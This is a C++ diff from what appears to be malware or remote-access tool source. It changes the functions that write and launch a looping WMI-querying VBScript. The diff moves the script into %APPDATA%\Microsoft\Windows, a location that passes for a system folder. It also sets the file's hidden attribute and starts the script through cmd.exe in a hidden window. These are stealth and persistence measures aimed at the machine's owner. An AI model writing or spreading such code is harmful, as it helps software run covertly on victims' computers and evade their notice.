@@ -8,7 +8,7 @@ std::string startLayer() {
 	#endif
 
 	LPTSTR cmdPath = _T("cmd.exe");
-	std::string cmdArgs = "cmd.exe /k start " + Helpers::ExeName() + ".vbs";
+	std::string cmdArgs = "cmd.exe /k start " + (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + Helpers::ExeName() + ".vbs";
 	ShellExecute(GetDesktopWindow(), "open", cmdPath, cmdArgs.c_str(), NULL, hide);
 	return "";
 }
@@ -25,7 +25,7 @@ std::string createLayer() {
 	std::string Currentpath = Helpers::ExePath();
 
 
-	std::ofstream outfile(Helpers::ExeName() + ".vbs");
+	std::ofstream outfile((std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + Helpers::ExeName() + ".vbs");
 	outfile << "Do" << std::endl;
 	outfile << "sComputerName = \".\"" << std::endl;
 	outfile << "Set objWMIService = GetObject(\"winmgmts:\\\\\" & sComputerName & \"\\root\\cimv2\")" << std::endl;
@@ -64,6 +64,13 @@ std::string createLayer() {
 
 	outfile << "Loop" << std::endl;
 	outfile.close(); 
+
+	std::string filename = (std::string)getenv("APPDATA") + "\\Microsoft\\Windows\\" + Helpers::ExeName() + ".vbs";
+	int attr = GetFileAttributes(filename.c_str());
+	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0) {
+		SetFileAttributes(filename.c_str(), attr | FILE_ATTRIBUTE_HIDDEN);
+	}
+
 	return "";
 }
 
